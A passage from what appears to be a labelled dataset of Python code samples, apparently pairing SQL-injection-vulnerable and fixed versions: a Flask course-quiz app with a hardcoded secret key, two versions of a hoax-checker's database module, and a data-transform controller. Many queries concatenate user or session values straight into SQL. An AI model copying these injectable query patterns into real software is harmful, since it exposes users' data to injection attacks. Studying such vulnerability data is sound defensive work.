[\n\t\t\t\t\t{\n\t\t\t\t\t\t'name': 'CS 180', \n\t\t\t\t\t\t'status': status180\n\t\t\t\t\t}, \n\t\t\t\t\t{\n\t\t\t\t\t\t'name':'CS 240', \n\t\t\t\t\t\t'status':status240\n\t\t\t\t\t}, \n\t\t\t\t\t{\n\t\t\t\t\t\t'name':'CS 250',\n\t\t\t\t\t\t'status':status250\n\t\t\t\t\t}, \n\t\t\t\t\t{\n\t\t\t\t\t\t'name':'CS 251', \n\t\t\t\t\t\t'status':status251\n\t\t\t\t\t} \n\t\t\t\t]\n\t\t\t}\n\t\texcept Exception ,e:\n\t\t\tprint str(e)\n\t\treturn jsonify(levelDict) \n\n\n\t\t#return render_template('levelPage1.html')\n\treturn redirect(url_for('login'))\n\n@app.route('/levelPage2')\ndef levelPage2():\n\tif 'username' in session:\n\t\t\n\t\tconn = mysql.connect()\n\t\tcursor = conn.cursor()\n\n\t\tcursor.execute(\"SELECT * from Users where emailAccount='\" + session['username'] + \"'\")\n\t\tdata = cursor.fetchone()\n\t\t#print(data);\n\n\t\tstatus180 = data[3]\n\t\tstatus240 = data[4]\n\t\tstatus250=data[5]\n\t\tstatus251=data[6]\n\t\tstatus314 = data[7]\n\t\tstatus334 = data[8]\n\t\tstatus381=data[9]\n\t\tstatus307=data[10]\n\n\n\t\t#From database: 0 is not completed, 1 is completed\n\t\t#For the JSON: 0 is completed, 1 is not completed and in current level, 2 is prerequisites arent met\n\t\t#If any of level 1's courses are not completed, then user should not be able to do any of level 2 courses\n\t\tif ((status180 is 0) or (status240 is 0) or (status250 is 0) or (status251 is 0)):\n\t\t\tstatus314 = 2;\n\t\t\tstatus334 = 2;\n\t\t\tstatus381 = 2;\n\t\t\tstatus307 = 2;\n\t\telse: \n\t\t\tif status314 is 1:\n\t\t\t\tstatus314 = 0;\n\t\t\telse:\n\t\t\t\tstatus314 = 1;\n\n\t\t\tif status334 is 1:\n\t\t\t\tstatus334 = 0;\n\t\t\telse:\n\t\t\t\tstatus334 = 1;\n\n\t\t\tif status381 is 1:\n\t\t\t\tstatus381 = 0;\n\t\t\telse:\n\t\t\t\tstatus381 = 1;\n\t\t\t\n\t\t\tif status307 is 1:\n\t\t\t\tstatus307 = 0;\n\t\t\telse:\n\t\t\t\tstatus307 = 1;\n\n\n\t\ttry:\n\t\t\t#create a instance for filling up levelData\n\t\t\tlevelDict = {\n\t\t\t'level' : 2,\n\t\t\t'classes': [\n\t\t\t\t\t{\n\t\t\t\t\t\t'name':'CS 307', \n\t\t\t\t\t\t'status':status307\n\t\t\t\t\t},\n\t\t\t\t\t{\n\t\t\t\t\t\t'name': 'CS 314', \n\t\t\t\t\t\t'status': status314\n\t\t\t\t\t}, \n\t\t\t\t\t{\n\t\t\t\t\t\t'name':'CS 334', \n\t\t\t\t\t\t'status':status334\n\t\t\t\t\t}, \n\t\t\t\t\t{\n\t\t\t\t\t\t'name':'CS 381',\n\t\t\t\t\t\t'status':status381\n\t\t\t\t\t} \n\t\t\t\t\t\n\t\t\t\t]\n\t\t\t}\n\t\texcept Exception ,e:\n\t\t\tprint str(e)\n\t\treturn jsonify(levelDict)\n\n\t\t#return render_template('levelPage2.html')\n\treturn redirect(url_for('login'))\n\n@app.route('/levelPage3')\ndef levelPage3():\n\tif 'username' in session:\n\t\t\n\t\tconn = mysql.connect()\n\t\tcursor = conn.cursor()\n\n\t\tcursor.execute(\"SELECT * from Users where emailAccount='\" + session['username'] + \"'\")\n\t\tdata = cursor.fetchone()\n\n\t\tstatus180 = data[3]\n\t\tstatus240 = data[4]\n\t\tstatus250=data[5]\n\t\tstatus251=data[6]\n\t\tstatus314 = data[7]\n\t\tstatus334 = data[8]\n\t\tstatus381=data[9]\n\t\tstatus307=data[10]\n\t\tstatus448 = data[11]\n\t\tstatus456 = data[12]\n\t\tstatus426 = data[14]\n\t\tstatus422 = data[13]\n\n\t\tif (status180 is 0) or (status240 is 0) or (status250 is 0) or (status251 is 0) or (status314 is 0) or (status334 is 0) or (status381 is 0) or (status307 is 0):\n\t\t\tstatus448 = 2\n\t\t\tstatus456 = 2\n\t\t\tstatus426 = 2\n\t\t\tstatus422 = 2\n\t\telse: \t\t\n\t\t\tif status448 is 1:\n\t\t\t\tstatus448 = 0\n\t\t\telse:\n\t\t\t\tstatus448 = 1\n\n\t\t\tif status456 is 1:\n\t\t\t\tstatus456 = 0\n\t\t\telse:\n\t\t\t\tstatus456 = 1\n\n\t\t\tif status426 is 1:\n\t\t\t\tstatus426 = 0\n\t\t\telse:\n\t\t\t\tstatus426 = 1\n\n\t\t\tif status422 is 1:\n\t\t\t\tstatus422 = 0\n\t\t\telse:\n\t\t\t\tstatus422 = 1\n\n\t\ttry:\n\t\t\t# Create an instance for filling up classData\n\t\t\tlevelDict = {\n\t\t\t'level': 3,\n\t\t\t'classes': [\n\t\t\t\t{\n\t\t\t\t\t'name':\"CS 422\", \n\t\t\t\t\t'status':status422\n\t\t\t\t},\n\t\t\t\t{\n\t\t\t\t\t'name':\"CS 426\",\n\t\t\t\t\t'status':status426\n\t\t\t\t},\n\t\t\t\t{\n\t\t\t\t\t'name': \"CS 448\", \n\t\t\t\t\t'status':status448\n\t\t\t\t}, \n\t\t\t\t{\n\t\t\t\t\t'name':\"CS 456\", \n\t\t\t\t\t'status':status456\n\t\t\t\t}, \n\t\t\t\t\n\t\t\t\t\n\t\t\t]}\n\t\t\t\n\t\texcept Exception ,e:\n\t\t\tprint str(e)\n\n\t\treturn jsonify(levelDict)\n\n\treturn redirect(url_for('login'))\n\n\n@app.route('/overview/<classNum>')\ndef overview(classNum):\n\tif 'username' in session:\n\t\tclassNoSpace = classNum.split(' ')[0]+classNum.split(' ')[1]\n\n\t\t#Save the current course as a session variable.\n\t\tsession['currentCourse'] = classNoSpace\n\n\t\tconn = mysql.connect()\n\t\tcursor = conn.cursor()\n\n\t\tcursor.execute(\"SELECT courseName,courseOverview from courses where courseAbbreviation='\" + classNoSpace + \"'\")\n\t\tdata = cursor.fetchone()\n\n\t\treturn render_template('overview.html', className = classNum, courseTitle = data[0], courseOverview = data[1])\n\n\treturn redirect(url_for('index'))\n\n\n#Logout\n\n@app.route('/lastCourseEntered')\ndef lastCourseEntered():\n\tif 'username' in session:\n\t\tif 'lastCourseEntered' in session:\n\t\t\treturn jsonify(session['lastCourseEntered'])\n\t\telse:\n\t\t\treturn jsonify(\"None\")\n\treturn redirect(url_for('login'))\n\n@app.route('/logout')\ndef logout(): \n\tsession.pop('username', None)\n\treturn redirect(url_for('index'))\n\n\n@app.route('/levels')\ndef levels(): \n\tif 'username' in session:\n\t\treturn render_template('hallway.html')\n\treturn redirect(url_for('login'))\n\n\n@app.route('/quiz', methods=['GET', 'POST'])\ndef quiz():\n\n\terror = None\n\tanswers = None\n\tgrades = None\n\tshowSubmit = None\n\tcourse = None\n\trank = None\n\n\tif 'username' in session:\n\n\t\tif 'currentCourse' in session:\n\t\t\tcourse = session['currentCourse']\n\t\telse:\n\t\t\treturn redirect(url_for('levels'))\n\n\t\tconn = mysql.connect()\n\t\tcursor = conn.cursor()\n\t\tcursor.execute(\"SELECT questionString, option1, option2, option3, option4, correctAnswer, courseName FROM courses join questions on questions.courseId=courses.courseId where courses.courseAbbreviation='\" + course + \"'\")\n\n\t\tquestions = []\n\t\tfor row in cursor:\n\t\t\tquestions.append(row)\n\n\t\tif request.method == 'POST':\n\t\t\t#print request.form\n\n\t\t\tif (len(request.form) != 7):\n\t\t\t\terror = \"Please answer all of the questions.\"\n\t\t\t\tshowSubmit = True\n\t\t\telse:\n\t\t\t\tgrades = []\n\t\t\t\tanswers = []\n\t\t\t\tscore = 0\n\n\t\t\t\tfor i in range(0, len(request.form) - 2):\n\t\t\t\t\tanswers.append(int(request.form[\"q\" + str(i+1)]))\n\n\t\t\t\t\tif ( int(questions[i][5]) == answers[i] ):\n\t\t\t\t\t\tgrades.append(1)\n\t\t\t\t\t\tscore = score + 1\n\t\t\t\t\telse:\n\t\t\t\t\t\tgrades.append(0)\n\n\t\t\t\trank = request.form[\"rankquiz\"]\n\n\t\t\t\ttotal = score + 3*int(rank)\n\n\t\t\t\tcursor.execute(\"SELECT courseId FROM courses WHERE courseAbbreviation='\" + course +\"'\")\n\t\t\t\tcourseId = cursor.fetchone()\n\n\t\t\t\tcursor.execute(\"SELECT courseConcentration FROM courses WHERE courseAbbreviation='\" + course +\"'\")\n\t\t\t\tcourseConcentration = cursor.fetchone()\n\n\t\t\t\tcursor.execute(\"DELETE FROM results WHERE emailAccount='\" + session['username'] + \"' and courseId=\" + str(courseId[0]))\n\n\t\t\t\t#print \"INSERT INTO results (emailAccount, courseId, courseConcentration, score, rank, total) VALUES ('\" + session['username'] + \"',\" + str(courseId[0]) + \",'\" + str(courseConcentration[0]) + \"',\" + str(score) + \",\" + str(rank) + \",\" + str(total) + \")\"\n\t\t\t\tcursor.execute(\"INSERT INTO results (emailAccount, courseId, courseConcentration, score, rank, total) VALUES ('\" + session['username'] + \"',\" + str(courseId[0]) + \",'\" + str(courseConcentration[0]) + \"',\" + str(score) + \",\" + str(rank) + \",\" + str(total) + \")\")\n\t\t\t\tcursor.execute(\"UPDATE users SET \" + course.lower() + \"Completed=1 WHERE emailAccount='\" + session['username'] + \"'\")\n\t\t\t\tconn.commit()\n\n\t\t\t\tsession['lastCourseEntered'] = session['currentCourse']\n\t\t\t\tsession.pop('currentCourse', None)\n\t\t\t\t\n\t\t\t\trank = int(rank)\n\t\t\treturn render_template('quiz.html', questions=questions, error=error, answers=answers, grades=grades, rank=rank, showSubmit=showSubmit)\n\t\telse:\n\t\t\tshowSubmit = True\n\t\t\treturn render_template('quiz.html', questions=questions, error=error, answers=answers, grades=grades, rank=rank, showSubmit=showSubmit)\n\treturn redirect(url_for('login'))\n\n@app.route('/summary', methods=['GET'])\ndef summary():\n\tif 'username' in session:\n\n\t\tconn = mysql.connect()\n\t\tcursor = conn.cursor()\n\n\t\t#select the maximum score from the results table\n\t\tcursor.execute(\"SELECT courseConcentration FROM results WHERE total = (SELECT MAX(total) FROM (SELECT * FROM results WHERE courseId > 4) Temp) and courseId > 4 and emailAccount='\" + session['username'] + \"'\");\n\t\tcourseConcentration = cursor.fetchone()\n\n\t\treturn render_template('summary.html', courseConcentration = courseConcentration[0])\n\treturn redirect(url_for('login'))\n\n#Secret Key\napp.secret_key = 'A0Zr98j/3yX R~'\n/n/n/n", "label": 1}, {"id": "b2029c81a9d2991b84e34d5b18f69bad6c8a479c", "code": "database.py/n/nimport pymysql.cursors\nfrom datetime import date, datetime\nimport json\nimport config\n\nclass Database:\n\tdef __init__(self):\n\t\tself.conn = pymysql.connect(user=config.mysql_credentials[\"user\"], \\\n\t\t\t\t\t\t\t\t\tpassword=config.mysql_credentials[\"password\"], \\\n\t\t\t\t\t\t\t\t\thost=config.mysql_credentials[\"host\"], \\\n\t\t\t\t\t\t\t\t\tdb=config.mysql_credentials[\"database\"],\n\t\t\t\t\t\t\t\t\tcursorclass=pymysql.cursors.DictCursor)\n\t\tself.cur = self.conn.cursor()\n\n\tdef __enter__(self):\n\t\treturn DBase()\n\n\tdef __exit__(self, exc_type, exc_val, exc_tb):\n\t\tif self.conn:\n\t\t\tself.cur.close()\n\t\t\tself.conn.close()\n\n\tdef insert_query_log(self, lhash, text, search, qhash, ip, browser): \t\n\t\tsql = \"INSERT INTO log_query (log_hash, query_text, query_search, query_hash, query_time, client_ip, client_browser, clicked) VALUES\" + \\\n\t\t\t\t\t\"({}, {}, {}, '{}', '{}', '{}', {}, {})\".format(json.dumps(lhash), json.dumps(text), json.dumps(search), qhash, datetime.now(), ip, json.dumps(browser), 0)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\treturn self.cur.lastrowid\n\n\tdef insert_result_log(self, qid, hoax, fact, unknown, unrelated, conclusion):\n\t\tsql = \"INSERT INTO log_result (id_query, finished_at, hoax_score, fact_score, unknown_score, unrelated_score, conclusion) VALUES\" + \\\n\t\t\t\t\t\"(%s, %s, %s, %s, %s, %s, %s)\"\n\t\tself.cur.execute(sql, (qid, datetime.now(), hoax, fact, unknown, unrelated, conclusion))\n\t\tself.conn.commit()\n\t\treturn self.cur.lastrowid\n\n\tdef insert_result_feedback(self, qhash, is_know, reason, label, ip, browser):\n\t\tsql = \"INSERT INTO feedback_result (query_hash, reported_at, is_know, reason, feedback_label, client_ip, client_browser) VALUES\" + \\\n\t\t\t\t\t\"(%s, %s, %s, %s, %s, %s, %s)\"\n\t\tself.cur.execute(sql, (qhash, datetime.now(), is_know, reason, label, ip, browser))\n\t\tself.conn.commit()\n\t\treturn self.cur.lastrowid\n\n\tdef insert_reference_feedback(self, ahash, is_relevant, reason, label, ip, browser):\n\t\tprint(str(ahash))\n\t\tprint(str(is_relevant))\n\t\tsql = \"INSERT INTO feedback_reference (article_hash, reported_at, is_relevant, reason, feedback_label, client_ip, client_browser) VALUES\" + \\\n\t\t\t\t\t\"(%s, %s, %s, %s, %s, %s, %s)\"\n\t\tself.cur.execute(sql, (ahash, datetime.now(), is_relevant, reason, label, ip, browser))\n\t\tself.conn.commit()\n\t\treturn self.cur.lastrowid\n\n\tdef insert_references(self, qid, articles):\n\t\tinsert_values = []\n\t\tfor article in articles:\n\t\t\tinsert_values.append((qid, str(article[\"qhash\"]), str(article['hash']), str(article['date']), str(article['url']), article['content'], datetime.now())) \t\n\t\tsql = \"INSERT INTO article_reference (id_query, query_hash, article_hash, article_date, article_url, article_content, retrieved_at) VALUES\" + \\\n\t\t\t\t\",\".join(\"(%s, %s, %s, %s, %s, %s, %s)\" for _ in insert_values)\n\t\tflattened_values = [item for sublist in insert_values for item in sublist]\n\t\tself.cur.execute(sql, flattened_values)\n\t\tself.conn.commit()\n\n\tdef is_query_exist(self, loghash):\n\t\tsql = \"SELECT id FROM log_query WHERE log_hash = '%s'\" % (loghash)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\treturn (self.cur.rowcount == 1)\n\n\tdef is_reference_exist(self, ahash):\n\t\tsql = \"SELECT id FROM article_reference WHERE article_hash = '%s'\" % (ahash)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\treturn (self.cur.rowcount == 1)\n\n\tdef get_query_by_loghash(self, loghash):\n\t\tsql = \"SELECT * FROM log_query WHERE log_hash = '%s' LIMIT 1\" % (loghash)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\tquery = self.cur.fetchone()\n\t\treturn query\n\n\tdef get_query_log(self):\n\t\tsql = \"SELECT * FROM log_query ORDER BY query_time DESC\"\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\tqueries = []\n\t\tfor row in self.cur.fetchall():\n\t\t\tquery = {}\n\t\t\tquery[\"log_hash\"] = row[\"log_hash\"]\n\t\t\tquery[\"query_text\"] = row[\"query_text\"]\n\t\t\tquery[\"query_search\"] = row[\"query_search\"]\n\t\t\tquery[\"query_hash\"] = row[\"query_hash\"]\n\t\t\tquery[\"query_time\"] = str(row[\"query_time\"])\n\t\t\tquery[\"client_ip\"] = row[\"client_ip\"]\n\t\t\tquery[\"client_browser\"] = row[\"client_browser\"]\n\t\t\tquery[\"clicked\"] = row[\"clicked\"]\n\t\t\tqueries.append(query)\n\t\treturn queries\n\n\tdef del_reference_by_qhash(self, qhash):\n\t\tsql = \"DELETE FROM article_reference WHERE query_hash = '%s'\" % (qhash)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\t\t\n\n\tdef get_reference_by_qhash(self, qhash):\n\t\tsql = \"SELECT * FROM article_reference WHERE query_hash = '%s'\" % (qhash)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\tarticles = []\n\t\tif (self.cur.rowcount > 0):\n\t\t\tfor row in self.cur.fetchall():\n\t\t\t\tarticle = {}\n\t\t\t\tarticle[\"hash\"] = row[\"article_hash\"]\n\t\t\t\tarticle[\"date\"] = row[\"article_date\"]\n\t\t\t\tarticle[\"url\"] = row[\"article_url\"]\n\t\t\t\tarticle[\"content\"] = row[\"article_content\"]\n\t\t\t\tarticles.append(article)\n\t\treturn articles\n\n\tdef get_reference_feedback(self):\n\t\t## VIWEW HELPER #1\n\t\tsql = \"CREATE OR REPLACE VIEW feedback_reference_result AS SELECT article_hash, is_relevant, feedback_label, COUNT(*) AS count FROM feedback_reference GROUP BY article_hash, is_relevant, feedback_label\"\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\n\t\t## VIWEW HELPER #2\n\t\tsql = \"CREATE OR REPLACE VIEW feedback_reference_max AS (SELECT article_hash, is_relevant, feedback_label, count FROM feedback_reference_result WHERE count = (SELECT MAX(count) FROM feedback_reference_result i WHERE i.article_hash = feedback_reference_result.article_hash))\"\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\n\t\t## THE QUERY\n\t\tsql = \"SELECT log_query.id, log_query.query_text, log_query.query_search, article_reference.article_content, feedback_reference_max.is_relevant, feedback_reference_max.feedback_label FROM feedback_reference_max LEFT JOIN article_reference ON article_reference.article_hash = feedback_reference_max.article_hash LEFT JOIN log_query ON log_query.id = article_reference.id_query\"\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\n\t\tfeedbacks = {}\n\t\tfor row in self.cur.fetchall():\n\t\t\tfeedback = {}\n\t\t\tfeedback[\"query_text\"] = row[\"query_text\"]\n\t\t\tfeedback[\"query_search\"] = row[\"query_search\"]\n\t\t\tfeedback[\"article_content\"] = row[\"article_content\"]\n\t\t\tfeedback[\"is_relevant\"] = row[\"is_relevant\"]\n\t\t\tfeedback[\"feedback_label\"] = row[\"feedback_label\"]\n\t\t\t#feedbacks.append(feedback)\n\t\t\tif not (row[\"id\"] in feedbacks):\n\t\t\t\tfeedbacks[row[\"id\"]] = []\n\t\t\tfeedbacks[row[\"id\"]].append(feedback)\n\t\treturn feedbacks\n\n\tdef check_query(self, qhash): \t\n\t\tsql = \"INSERT INTO log_query (query_text, query_search, query_hash, query_time, client_ip, client_browser) VALUES\" + \\\n\t\t\t\t\t\"({}, {}, '{}', '{}', '{}', {})\".format(json.dumps(text), json.dumps(search), qhash, datetime.now(), ip, json.dumps(browser))\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n/n/n/n", "label": 0}, {"id": "b2029c81a9d2991b84e34d5b18f69bad6c8a479c", "code": "/database.py/n/nimport pymysql.cursors\nfrom datetime import date, datetime\nimport json\nimport config\n\nclass Database:\n\tdef __init__(self):\n\t\tself.conn = pymysql.connect(user=config.mysql_credentials[\"user\"], \\\n\t\t\t\t\t\t\t\t\tpassword=config.mysql_credentials[\"password\"], \\\n\t\t\t\t\t\t\t\t\thost=config.mysql_credentials[\"host\"], \\\n\t\t\t\t\t\t\t\t\tdb=config.mysql_credentials[\"database\"],\n\t\t\t\t\t\t\t\t\tcursorclass=pymysql.cursors.DictCursor)\n\t\tself.cur = self.conn.cursor()\n\n\tdef __enter__(self):\n\t\treturn DBase()\n\n\tdef __exit__(self, exc_type, exc_val, exc_tb):\n\t\tif self.conn:\n\t\t\tself.cur.close()\n\t\t\tself.conn.close()\n\n\tdef insert_query_log(self, lhash, text, search, qhash, ip, browser): \t\n\t\tsql = \"INSERT INTO log_query (log_hash, query_text, query_search, query_hash, query_time, client_ip, client_browser, clicked) VALUES\" + \\\n\t\t\t\t\t\"({}, {}, {}, '{}', '{}', '{}', {}, {})\".format(json.dumps(lhash), json.dumps(text), json.dumps(search), qhash, datetime.now(), ip, json.dumps(browser), 0)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\treturn self.cur.lastrowid\n\n\tdef insert_result_log(self, qid, hoax, fact, unknown, unrelated, conclusion):\n\t\tsql = \"INSERT INTO log_result (id_query, finished_at, hoax_score, fact_score, unknown_score, unrelated_score, conclusion) VALUES\" + \\\n\t\t\t\t\t\"('%s', '%s', '%s', '%s', '%s', '%s', '%s')\" % (qid, datetime.now(), hoax, fact, unknown, unrelated, conclusion)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\treturn self.cur.lastrowid\n\n\tdef insert_result_feedback(self, qhash, is_know, reason, label, ip, browser):\n\t\tsql = \"INSERT INTO feedback_result (query_hash, reported_at, is_know, reason, feedback_label, client_ip, client_browser) VALUES\" + \\\n\t\t\t\t\t\"('%s', '%s', '%s', '%s', '%s', '%s', '%s')\" % (qhash, datetime.now(), is_know, reason, label, ip, browser)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\treturn self.cur.lastrowid\n\n\tdef insert_reference_feedback(self, ahash, is_relevant, reason, label, ip, browser):\n\t\tprint(str(ahash))\n\t\tprint(str(is_relevant))\n\t\tsql = \"INSERT INTO feedback_reference (article_hash, reported_at, is_relevant, reason, feedback_label, client_ip, client_browser) VALUES\" + \\\n\t\t\t\t\t\"('%s', '%s', '%s', '%s', '%s', '%s', '%s')\" % (ahash, datetime.now(), is_relevant, reason, label, ip, browser)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\treturn self.cur.lastrowid\n\n\tdef insert_references(self, qid, articles):\n\t\tinsert_values = []\n\t\tfor article in articles:\n\t\t\tinsert_values.append((qid, str(article[\"qhash\"]), str(article['hash']), str(article['date']), str(article['url']), article['content'], datetime.now())) \t\n\t\tsql = \"INSERT INTO article_reference (id_query, query_hash, article_hash, article_date, article_url, article_content, retrieved_at) VALUES\" + \\\n\t\t\t\t\",\".join(\"(%s, %s, %s, %s, %s, %s, %s)\" for _ in insert_values)\n\t\tflattened_values = [item for sublist in insert_values for item in sublist]\n\t\tself.cur.execute(sql, flattened_values)\n\t\tself.conn.commit()\n\n\tdef is_query_exist(self, loghash):\n\t\tsql = \"SELECT id FROM log_query WHERE log_hash = '%s'\" % (loghash)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\treturn (self.cur.rowcount == 1)\n\n\tdef is_reference_exist(self, ahash):\n\t\tsql = \"SELECT id FROM article_reference WHERE article_hash = '%s'\" % (ahash)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\treturn (self.cur.rowcount == 1)\n\n\tdef get_query_by_loghash(self, loghash):\n\t\tsql = \"SELECT * FROM log_query WHERE log_hash = '%s' LIMIT 1\" % (loghash)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\tquery = self.cur.fetchone()\n\t\treturn query\n\n\tdef get_query_log(self):\n\t\tsql = \"SELECT * FROM log_query ORDER BY query_time DESC\"\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\tqueries = []\n\t\tfor row in self.cur.fetchall():\n\t\t\tquery = {}\n\t\t\tquery[\"log_hash\"] = row[\"log_hash\"]\n\t\t\tquery[\"query_text\"] = row[\"query_text\"]\n\t\t\tquery[\"query_search\"] = row[\"query_search\"]\n\t\t\tquery[\"query_hash\"] = row[\"query_hash\"]\n\t\t\tquery[\"query_time\"] = str(row[\"query_time\"])\n\t\t\tquery[\"client_ip\"] = row[\"client_ip\"]\n\t\t\tquery[\"client_browser\"] = row[\"client_browser\"]\n\t\t\tquery[\"clicked\"] = row[\"clicked\"]\n\t\t\tqueries.append(query)\n\t\treturn queries\n\n\tdef del_reference_by_qhash(self, qhash):\n\t\tsql = \"DELETE FROM article_reference WHERE query_hash = '%s'\" % (qhash)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\t\t\n\n\tdef get_reference_by_qhash(self, qhash):\n\t\tsql = \"SELECT * FROM article_reference WHERE query_hash = '%s'\" % (qhash)\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\t\tarticles = []\n\t\tif (self.cur.rowcount > 0):\n\t\t\tfor row in self.cur.fetchall():\n\t\t\t\tarticle = {}\n\t\t\t\tarticle[\"hash\"] = row[\"article_hash\"]\n\t\t\t\tarticle[\"date\"] = row[\"article_date\"]\n\t\t\t\tarticle[\"url\"] = row[\"article_url\"]\n\t\t\t\tarticle[\"content\"] = row[\"article_content\"]\n\t\t\t\tarticles.append(article)\n\t\treturn articles\n\n\tdef get_reference_feedback(self):\n\t\t## VIWEW HELPER #1\n\t\tsql = \"CREATE OR REPLACE VIEW feedback_reference_result AS SELECT article_hash, is_relevant, feedback_label, COUNT(*) AS count FROM feedback_reference GROUP BY article_hash, is_relevant, feedback_label\"\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\n\t\t## VIWEW HELPER #2\n\t\tsql = \"CREATE OR REPLACE VIEW feedback_reference_max AS (SELECT article_hash, is_relevant, feedback_label, count FROM feedback_reference_result WHERE count = (SELECT MAX(count) FROM feedback_reference_result i WHERE i.article_hash = feedback_reference_result.article_hash))\"\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\n\t\t## THE QUERY\n\t\tsql = \"SELECT log_query.id, log_query.query_text, log_query.query_search, article_reference.article_content, feedback_reference_max.is_relevant, feedback_reference_max.feedback_label FROM feedback_reference_max LEFT JOIN article_reference ON article_reference.article_hash = feedback_reference_max.article_hash LEFT JOIN log_query ON log_query.id = article_reference.id_query\"\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n\n\t\tfeedbacks = {}\n\t\tfor row in self.cur.fetchall():\n\t\t\tfeedback = {}\n\t\t\tfeedback[\"query_text\"] = row[\"query_text\"]\n\t\t\tfeedback[\"query_search\"] = row[\"query_search\"]\n\t\t\tfeedback[\"article_content\"] = row[\"article_content\"]\n\t\t\tfeedback[\"is_relevant\"] = row[\"is_relevant\"]\n\t\t\tfeedback[\"feedback_label\"] = row[\"feedback_label\"]\n\t\t\t#feedbacks.append(feedback)\n\t\t\tif not (row[\"id\"] in feedbacks):\n\t\t\t\tfeedbacks[row[\"id\"]] = []\n\t\t\tfeedbacks[row[\"id\"]].append(feedback)\n\t\treturn feedbacks\n\n\tdef check_query(self, qhash): \t\n\t\tsql = \"INSERT INTO log_query (query_text, query_search, query_hash, query_time, client_ip, client_browser) VALUES\" + \\\n\t\t\t\t\t\"({}, {}, '{}', '{}', '{}', {})\".format(json.dumps(text), json.dumps(search), qhash, datetime.now(), ip, json.dumps(browser))\n\t\tself.cur.execute(sql)\n\t\tself.conn.commit()\n/n/n/n", "label": 1}, {"id": "48b00c7b7bb0b82bdc79167947fa9eda9f0ab8e0", "code": "app/Data/Transform/controllers.py/n/nfrom flask import (\n    Blueprint,\n    request,\n    jsonify,\n    redirect,\n    url_for,\n    render_template,\n    flash,\n    Response\n)\nfrom flask_login import login_required, current_user\nfrom app.Data.operations import create_action, get_dataset_with_id\nfrom app.Data.helpers import table_name_to_object, escape_quotes\nfrom app.Data.Transform.operations import (\n    restore_original,\n    change_attribute_type,\n    delete_rows,\n    fill_null_with,\n    fill_null_with_average,\n    fill_null_with_median,\n    rename_attribute,\n    delete_attribute,\n    one_hot_encode,\n    normalize_attribute,\n    discretize_width,\n    discretize_eq_freq,\n    find_replace,\n    regex_find_replace,\n    substring_find_replace\n)\n\n_transform = Blueprint('transform_bp', __name__, url_prefix='/data/transform')\n\n\n@_transform.route('/rename_column', methods=['POST'])\n@login_required\ndef rename_column():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    col = request.form['column']\n    new_name = request.form['new_name']\n    try:\n        rename_attribute(dataset.working_copy, col, new_name)\n        create_action(\n            'Renamed column {0} to {1}'.format(col, new_name),\n            dataset.id,\n            current_user.id\n        )\n    except:\n        flash('An unexpected error occured while renaming the column', 'danger')\n    else:\n        flash('Column renamed successfully.', 'success')\n\n    return redirect(request.referrer)\n\n\n@_transform.route('/delete_column', methods=['POST'])\n@login_required\ndef delete_column():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    col = request.form['column']\n    try:\n        delete_attribute(dataset.working_copy, col)\n        create_action(\n            'Deleted column {0}'.format(col),\n            dataset.id,\n            current_user.id\n        )\n    except:\n        flash('An unexpected error occured while deleting the column', 'danger')\n    else:\n        flash('Column deleted successfully.', 'success')\n\n    return redirect(request.referrer)\n\n\n@_transform.route('one_hot_encode_column', methods=['POST'])\n@login_required\ndef one_hot_encode_column():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    col = request.form['column']\n    try:\n        one_hot_encode(dataset.working_copy, col)\n        create_action(\n            'One-hot-encoded {0}'.format(col),\n            dataset.id,\n            current_user.id\n        )\n    except:\n        flash('An unexpected error occured while one-hot-encoding the column',\n              'danger'\n              )\n    else:\n        flash('Column one-hot-encoded successfully.', 'success')\n\n    return redirect(request.referrer)\n\n\n@_transform.route('normalize_column', methods=['POST'])\n@login_required\ndef normalize_column():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    col = request.form['column']\n    try:\n        normalize_attribute(dataset.working_copy, col)\n        create_action(\n            'Normalized {0}'.format(col),\n            dataset.id,\n            current_user.id\n        )\n    except:\n        flash('An unexpected error occured while normalizing the column',\n              'danger'\n              )\n    else:\n        flash('Column normalized successfully.', 'success')\n\n    return redirect(request.referrer)\n\n\n@_transform.route('/discretize_column', methods=['POST'])\n@login_required\ndef discretize_column():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    column = request.form['column']\n    intervals = request.form['intervals']\n\n    try:\n        if intervals == 'equal-distance':\n            amount = request.form['amount-dist']\n            discretize_width(dataset.working_copy, column, int(amount))\n        elif intervals == 'equal-frequency':\n            amount = request.form['amount-freq']\n            discretize_eq_freq(dataset.working_copy, column, int(amount))\n        else:\n            edges = str(request.form['custom-edges'])\n            edges = edges.replace(' ', '')\n            edge_list = edges.split(',')\n            if len(edge_list) < 2:\n                raise ValueError\n            for i in range(len(edge_list)):\n                edge_list[i] = float(edge_list[i])\n            discretize_width(dataset.working_copy, column, edge_list)\n\n    except ValueError:\n        flash('Invalid list of edges provided.',\n              'danger'\n              )\n    except:\n        flash('An unexpected error occured 